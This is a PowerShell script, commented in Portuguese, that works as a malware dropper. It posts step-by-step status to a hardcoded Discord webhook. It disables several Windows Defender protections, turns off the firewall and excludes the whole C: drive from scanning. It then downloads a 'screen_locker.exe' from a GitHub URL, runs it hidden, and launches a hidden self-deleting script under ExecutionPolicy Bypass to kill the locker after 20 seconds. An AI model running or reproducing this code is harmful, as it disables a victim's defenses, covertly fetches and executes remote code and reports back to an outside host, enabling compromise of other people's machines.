# ---------- Função de webhook ----------
function Send-DiscordWebhook {
    param([string]$Message)
    $webhookUrl = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"
    $escaped = $Message -replace '"', '\"' -replace "`n", '\n' -replace "`r", '\r'
    $json = "{`"content`":`"$escaped`"}"
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $json -ContentType "application/json" -ErrorAction Stop | Out-Null
    } catch {
        $logFile = "$env:TEMP\webhook_log.txt"
        Add-Content -Path $logFile -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] ERRO: $Message - $($_.Exception.Message)"
    }
}

# ==================================================
# 1. DESATIVAÇÕES
# ==================================================
Send-DiscordWebhook "🛡️ Desativando bloqueio à primeira vista (1/6)"
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Desativando IOAV (2/6)"
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Desativando escaneamento de scripts (3/6)"
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Desativando envio de amostras (4/6)"
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue

Send-DiscordWebhook "🛡️ Desativando MAPS (5/6)"
Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue

Send-DiscordWebhook "🔥 Desligando Firewall (6/6)"
netsh advfirewall set allprofiles state off

# ==================================================
# 2. EXCLUSÃO DO DISCO C:\
# ==================================================
$drive = [char]67 + ':\'
Add-MpPreference -ExclusionPath $drive -ErrorAction SilentlyContinue

# ==================================================
# 3. BAIXA E INICIA O SCREEN LOCKER
# ==================================================
Send-DiscordWebhook "📅 Iniciando Screen Locker (com auto-morte em 20s)"
$lockerUrl = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/screen_locker.exe"
$lockerPath = "$env:TEMP\screen_locker.exe"
(New-Object Net.WebClient).DownloadFile($lockerUrl, $lockerPath)
Start-Process -FilePath $lockerPath -WindowStyle Hidden

# ==================================================
# 4. AGENDA A MORTE DO LOCKER EM 20 SEGUNDOS
# ==================================================
$killScript = @"
Start-Sleep -Seconds 20
Get-Process -Name "screen_locker" -ErrorAction SilentlyContinue | Stop-Process -Force
Remove-Item -Path "`$MyInvocation.MyCommand.Path" -Force -ErrorAction SilentlyContinue
"@
$killScriptPath = "$env:TEMP\kill_locker.ps1"
$killScript | Out-File -FilePath $killScriptPath -Force
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$killScriptPath`"" -WindowStyle Hidden

# Fim do script (sem agendamento, sem handshake, sem enable_all)
